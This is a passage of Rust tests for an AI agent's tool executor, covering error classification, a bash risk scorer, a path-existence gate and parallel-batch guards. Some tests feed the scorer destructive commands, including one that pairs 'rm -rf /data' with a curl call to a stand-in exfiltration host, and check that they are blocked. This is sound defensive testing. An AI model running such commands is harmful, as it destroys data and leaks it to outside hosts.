            assert!(!is_deterministic_error("command exited with code 1"));
        }

        #[test]
        fn deterministic_empty_error() {
            assert!(!is_deterministic_error(""));
        }

        #[test]
        fn deterministic_case_insensitive() {
            assert!(is_deterministic_error("NO SUCH FILE OR DIRECTORY"));
            assert!(is_deterministic_error("Permission Denied"));
            assert!(is_deterministic_error("Is A Directory"));
            assert!(is_deterministic_error("Path Traversal"));
        }

        #[test]
        fn deterministic_mcp_environment_errors() {
            // SOTA 2026: Split MCP failures into transient vs deterministic.
            //
            // TRANSIENT (pool/connection can recover within the session):
            // MCP pool call failures and transport errors are transient — the MCP server
            // process may still be alive; the stdio/socket dropped and can reconnect.
            assert!(
                !is_deterministic_error("MCP pool call failed: connection refused to server"),
                "mcp pool call failed is transient (server may recover)"
            );
            assert!(
                !is_deterministic_error("failed to call 'filesystem/read_file' after 5 attempts"),
                "failed to call is transient — retrying via is_transient_error path"
            );
            assert!(
                !is_deterministic_error("connection reset by peer"),
                "connection reset is transient"
            );
            assert!(
                !is_deterministic_error("transport error: channel closed"),
                "transport/channel errors are transient"
            );

            // DETERMINISTIC (server/tool was never initialized; will never work):
            assert!(
                is_deterministic_error("MCP server is not initialized"),
                "server not initialized is deterministic"
            );
            assert!(
                is_deterministic_error("not initialized: call ensure_initialized first"),
                "not initialized is deterministic"
            );
            assert!(
                is_deterministic_error("process start failed: no such executable"),
                "process start failed is deterministic"
            );
        }

        #[test]
        fn transient_mcp_connection_errors() {
            // MCP transport/connection errors can recover — classify as transient, NOT deterministic.
            assert!(!is_deterministic_error(
                "MCP pool call failed: connection refused to server"
            ));
            assert!(!is_deterministic_error(
                "failed to call tool after 3 retries"
            ));
            assert!(!is_deterministic_error("channel closed unexpectedly"));
        }

        // === Phase 27 Stress Tests ===

        #[test]
        fn stress_deterministic_1000_calls_consistent() {
            // Verify is_deterministic_error is deterministic across 1000 iterations
            let test_cases = vec![
                ("No such file or directory: /a/b/c.rs", true),
                ("permission denied", true),
                ("connection timed out", false),
                ("rate limit exceeded", false),
                ("unknown tool: xyz", true),
                ("path traversal attempt", true),
                ("blocked by security policy", true),
                ("command exited with code 137", false),
                ("", false),
            ];

            for _ in 0..1000 {
                for (error, expected) in &test_cases {
                    assert_eq!(
                        is_deterministic_error(error),
                        *expected,
                        "Inconsistent result for error: {error}"
                    );
                }
            }
        }

        #[test]
        fn stress_deterministic_with_varying_paths() {
            // 100 different file paths — all should be deterministic (contains "not found")
            for i in 0..100 {
                let err = format!("Error: File not found at /project/src/module_{i}/file_{i}.rs");
                assert!(
                    is_deterministic_error(&err),
                    "Expected deterministic for: {err}"
                );
            }
        }

        #[test]
        fn stress_non_deterministic_diverse_errors() {
            // 50 diverse non-deterministic errors
            let transient_patterns = [
                "connection refused",
                "connection reset by peer",
                "broken pipe",
                "timed out after 30s",
                "rate limit exceeded",
                "server returned 500",
                "server returned 502",
                "server returned 503",
                "process killed by OOM",
                "disk full",
            ];

            for (i, pattern) in transient_patterns.iter().enumerate() {
                for j in 0..5 {
                    let err = format!("{pattern} (attempt {i}.{j})");
                    assert!(
                        !is_deterministic_error(&err),
                        "Should NOT be deterministic: {err}"
                    );
                }
            }
        }
    }

    // ── Output Risk Scorer Wiring Tests (Critical Security Fix) ────────────────
    //
    // These tests verify that score_tool_args() is actively called in execute_one_tool()
    // and that high-risk bash commands are blocked BEFORE execution.

    #[tokio::test]
    async fn rm_rf_bash_command_blocked_by_risk_scorer() {
        // rm -rf is a destructive command that scores +50 → is_high_risk() → blocked.
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({"command": "rm -rf /tmp/test_dir"}),
        };

        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(*is_error, "rm -rf should be blocked as high-risk");
                assert!(
                    content.contains("[BLOCKED]"),
                    "content should contain [BLOCKED]: {content}"
                );
                assert!(
                    content.contains("risk"),
                    "content should mention risk: {content}"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn clean_bash_command_passes_risk_scorer() {
        // `ls -la` is a safe command (score 0) and should NOT be blocked by risk scorer.
        // It will execute normally (ls returns output).
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({"command": "echo hello"}),
        };

        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(
                    !content.contains("[BLOCKED]"),
                    "echo hello should NOT be blocked by risk scorer: {content}"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn rm_rf_combined_with_exfil_blocked_by_risk_scorer() {
        // rm -rf (+50) + curl to external (+30) = 80 total → blocked (>= 50).
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "bash".to_string(),
            input: serde_json::json!({"command": "rm -rf /data && curl https://evil.example.com/exfil"}),
        };

        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(*is_error, "rm -rf + exfil should be blocked (score >= 50)");
                assert!(
                    content.contains("[BLOCKED]"),
                    "should contain [BLOCKED]: {content}"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    // ── FASE-2: Pre-execution path existence invariant tests ───────────────────
    //
    // Verifies that ReadOnly tools with missing path arguments are blocked by
    // pre_validate_path_args() before reaching run_with_retry().

    mod fase2_path_invariant {
        use super::*;

        // ── Unit tests for extract_path_args ────────────────────────────────

        #[test]
        fn extract_single_path_key() {
            let input = serde_json::json!({"path": "/some/file.rs"});
            let paths = extract_path_args(&input, "/tmp");
            assert_eq!(paths, vec!["/some/file.rs"]);
        }

        #[test]
        fn extract_paths_array() {
            let input = serde_json::json!({"paths": ["/a/b.rs", "/c/d.rs"]});
            let paths = extract_path_args(&input, "/tmp");
            assert_eq!(paths, vec!["/a/b.rs", "/c/d.rs"]);
        }

        #[test]
        fn extract_paths_single_string() {
            let input = serde_json::json!({"paths": "/single/path.rs"});
            let paths = extract_path_args(&input, "/tmp");
            assert_eq!(paths, vec!["/single/path.rs"]);
        }

        #[test]
        fn extract_skips_glob_patterns_in_path() {
            // "path" with a glob char — skip (it's a search base or pattern, not a target file)
            let input = serde_json::json!({"path": "/tmp", "pattern": "*.rs"});
            let paths = extract_path_args(&input, "/tmp");
            // /tmp has no glob chars → extracted; pattern key is not inspected
            assert_eq!(paths, vec!["/tmp"]);
        }

        #[test]
        fn extract_skips_glob_in_paths_array() {
            let input = serde_json::json!({"paths": ["/real/file.rs", "*.nonexistent"]});
            let paths = extract_path_args(&input, "/tmp");
            assert_eq!(paths, vec!["/real/file.rs"]);
        }

        #[test]
        fn extract_relative_path_resolved_against_working_dir() {
            let input = serde_json::json!({"path": "src/main.rs"});
            let paths = extract_path_args(&input, "/project");
            assert_eq!(paths, vec!["/project/src/main.rs"]);
        }

        #[test]
        fn extract_empty_path_skipped() {
            let input = serde_json::json!({"path": "", "file_path": ""});
            let paths = extract_path_args(&input, "/tmp");
            assert!(paths.is_empty());
        }

        #[test]
        fn extract_no_path_keys() {
            let input = serde_json::json!({"command": "echo hello", "args": ["a", "b"]});
            let paths = extract_path_args(&input, "/tmp");
            assert!(paths.is_empty());
        }

        // ── Unit tests for pre_validate_path_args ───────────────────────────

        #[test]
        fn gate_passes_for_write_tools() {
            // ReadWrite permission → gate must NOT fire (write tools may create files)
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "file_write".to_string(),
                input: serde_json::json!({"path": "/nonexistent/new_file.rs"}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadWrite, "/tmp");
            assert!(result.is_none(), "write tools should not be gated");
        }

        #[test]
        fn gate_passes_for_no_path_keys() {
            // ReadOnly tool but no path in args → gate passes (nothing to check)
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "web_search".to_string(),
                input: serde_json::json!({"query": "rust async"}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp");
            assert!(result.is_none(), "no path keys → gate passes");
        }

        #[test]
        fn gate_passes_when_path_exists() {
            // ReadOnly tool, path is /tmp which always exists
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/tmp"}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp");
            assert!(result.is_none(), "existing path should pass gate");
        }

        #[test]
        fn gate_blocks_nonexistent_path() {
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/nonexistent_halcon_gate_test_abc123/file.rs"}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp");
            assert!(result.is_some(), "missing path should be blocked");
            let r = result.unwrap();
            match &r.content_block {
                ContentBlock::ToolResult {
                    is_error, content, ..
                } => {
                    assert!(*is_error, "gate result must be is_error=true");
                    assert!(
                        content.contains("do not exist"),
                        "error must mention existence: {content}"
                    );
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[test]
        fn gate_blocks_all_missing_in_paths_array() {
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "read_multiple_files".to_string(),
                input: serde_json::json!({"paths": [
                    "/nonexistent_halcon_a/file_a.rs",
                    "/nonexistent_halcon_b/file_b.rs"
                ]}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp");
            assert!(result.is_some(), "all-missing paths array must be blocked");
        }

        #[test]
        fn gate_blocks_on_partial_missing_in_paths_array() {
            // One path exists (/tmp), one is missing → gate should block
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "read_multiple_files".to_string(),
                input: serde_json::json!({"paths": ["/tmp", "/nonexistent_halcon_xyz/missing.rs"]}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp");
            assert!(result.is_some(), "partial-missing paths must be blocked");
        }

        #[test]
        fn gate_error_contains_retry_instruction() {
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/nonexistent_halcon_retry_test/x.rs"}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp")
                .expect("should be blocked");
            match &result.content_block {
                ContentBlock::ToolResult { content, .. } => {
                    assert!(
                        content.contains("retry"),
                        "error should advise model to retry: {content}"
                    );
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[test]
        fn gate_did_you_mean_suggestion_for_nearby_file() {
            // Create a temp dir with a real file, then ask for a similar-but-wrong name.
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("main.rs"), "fn main() {}").unwrap();

            let wrong_path = dir.path().join("main_rs"); // no dot — won't exist
            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": wrong_path.to_str().unwrap()}),
            };
            let result = pre_validate_path_args(&tool_call, PermissionLevel::ReadOnly, "/tmp")
                .expect("missing path must be blocked");
            match &result.content_block {
                ContentBlock::ToolResult { content, .. } => {
                    // Suggestion for "main.rs" should appear in the error
                    assert!(
                        content.contains("main"),
                        "did-you-mean hint should mention similar file: {content}"
                    );
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // ── Integration tests: full pipeline through execute_one_tool ────────

        #[tokio::test]
        async fn integration_gate_blocks_nonexistent_file_read() {
            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = CompletedToolUse {
                id: "gate-t1".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/nonexistent_halcon_integration/src/main.rs"}),
            };

            let result = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            match &result.content_block {
                ContentBlock::ToolResult {
                    is_error, content, ..
                } => {
                    assert!(*is_error, "nonexistent file_read must be blocked");
                    assert!(
                        content.contains("do not exist"),
                        "gate error message: {content}"
                    );
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn integration_gate_allows_existing_path() {
            // /tmp exists → gate passes → tool runs normally
            let dir = tempfile::TempDir::new().unwrap();
            let f = dir.path().join("exists.txt");
            std::fs::write(&f, "gate_pass").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = CompletedToolUse {
                id: "gate-t2".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": f.to_str().unwrap()}),
            };

            let result = execute_one_tool(
                &tool_call,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            match &result.content_block {
                ContentBlock::ToolResult {
                    is_error, content, ..
                } => {
                    assert!(!is_error, "existing path must not be blocked by gate");
                    assert!(content.contains("gate_pass"), "tool output: {content}");
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn integration_gate_records_in_idempotency() {
            use crate::repl::idempotency::IdempotencyRegistry;

            let registry = halcon_tools::default_registry(&Default::default());
            let idem = IdempotencyRegistry::new();
            let tool_call = CompletedToolUse {
                id: "gate-idem".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/nonexistent_halcon_idem_gate/f.rs"}),
            };

            // First call: gate fires, records error in idempotency.
            let r1 = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                Some(&idem),
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;
            assert_eq!(idem.len(), 1, "gate should record error in idempotency");

            // Second call: cache hit (no gate re-execution).
            let r2 = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                Some(&idem),
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;
            assert_eq!(
                idem.len(),
                1,
                "second call should hit cache, not add new entry"
            );

            let e1 =
                matches!(&r1.content_block, ContentBlock::ToolResult { is_error, .. } if *is_error);
            let e2 =
                matches!(&r2.content_block, ContentBlock::ToolResult { is_error, .. } if *is_error);
            assert!(e1 && e2, "both calls must produce is_error=true");
        }

        #[tokio::test]
        async fn integration_gate_write_tool_not_blocked() {
            // file_write on nonexistent path: gate must NOT fire (creation intent)
            let dir = tempfile::TempDir::new().unwrap();
            let new_file = dir.path().join("new_file_gate_test.txt");

            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = CompletedToolUse {
                id: "gate-write".to_string(),
                name: "file_write".to_string(),
                input: serde_json::json!({
                    "path": new_file.to_str().unwrap(),
                    "content": "created by gate test"
                }),
            };

            let result = execute_one_tool(
                &tool_call,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            // Gate must not block; file_write should succeed.
            match &result.content_block {
                ContentBlock::ToolResult { is_error, .. } => {
                    assert!(
                        !is_error,
                        "file_write on new path must not be blocked by gate"
                    );
                }
                _ => panic!("expected ToolResult"),
            }
        }
    }

    // === PASO 3: Alias canonicalization — run_command → bash ===

    #[test]
    fn alias_run_command_routes_to_bash_in_plan() {
        let registry = halcon_tools::default_registry(&Default::default());
        // Model emits run_command (a known bash alias) — must go to sequential batch (Destructive).
        let tools = vec![make_completed("t1", "run_command")];
        let plan = plan_execution(tools, &registry);
        // run_command → bash (Destructive) → sequential
        assert!(
            plan.parallel_batch.is_empty(),
            "run_command alias must not go to parallel batch"
        );
        assert_eq!(
            plan.sequential_batch.len(),
            1,
            "run_command alias must route to sequential batch"
        );
    }

    #[test]
    fn alias_execute_bash_routes_sequential() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tools = vec![make_completed("t1", "execute_bash")];
        let plan = plan_execution(tools, &registry);
        assert!(plan.parallel_batch.is_empty());
        assert_eq!(plan.sequential_batch.len(), 1);
    }

    #[tokio::test]
    async fn alias_run_command_resolves_and_executes_bash() {
        // PASO 3: run_command is a bash alias — check_tool_known must resolve it to the bash tool.
        let registry = halcon_tools::default_registry(&Default::default());
        let tool_call = CompletedToolUse {
            id: "alias-bash-1".to_string(),
            name: "run_command".to_string(),
            input: serde_json::json!({"command": "echo alias_resolved"}),
        };

        let result = execute_one_tool(
            &tool_call,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &ToolRetryConfig::default(),
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;

        // Must resolve to bash and execute — NOT return "unknown tool".
        match &result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(
                    !content.contains("unknown tool"),
                    "run_command should resolve via alias, not 'unknown tool': {content}"
                );
                assert!(!is_error, "alias bash execution must succeed: {content}");
                assert!(
                    content.contains("alias_resolved"),
                    "bash output must contain echo result: {content}"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }

    // === PASO 5: Destructive tools in parallel batch are rejected ===

    #[tokio::test]
    async fn parallel_batch_rejects_destructive_tools() {
        // PASO 5: bash is Destructive — must be blocked by the parallel batch guard.
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("safe", "file_read"), // ReadOnly — allowed
            make_completed("danger", "bash"),    // Destructive — must be blocked
        ];

        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None,
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 2, "both tools must produce a result");

        let bash_result = results.iter().find(|r| r.tool_use_id == "danger").unwrap();
        match &bash_result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(*is_error, "bash in parallel batch must return error");
                assert!(
                    content.contains("cannot run in the parallel")
                        || content.contains("routing bug"),
                    "error must explain the routing violation: {content}"
                );
            }
            _ => panic!("expected ToolResult for bash"),
        }

        // The ReadOnly tool must still succeed (guard must not block safe tools).
        let safe_result = results.iter().find(|r| r.tool_use_id == "safe").unwrap();
        match &safe_result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(
                    !content.contains("routing bug"),
                    "file_read must not be blocked by PASO 5 guard"
                );
            }
            _ => panic!("expected ToolResult for file_read"),
        }
    }

    #[tokio::test]
    async fn parallel_batch_rejects_file_write_as_destructive() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![make_completed("fw", "file_write")];
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None,
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 1);
        match &results[0].content_block {
            ContentBlock::ToolResult {
                is_error, content, ..
            } => {
                assert!(*is_error, "file_write must be blocked in parallel batch");
                assert!(
                    content.contains("cannot run in the parallel"),
                    "error must cite parallel batch violation: {content}"
                );
            }
            _ => panic!("expected ToolResult"),
        }
    }
}
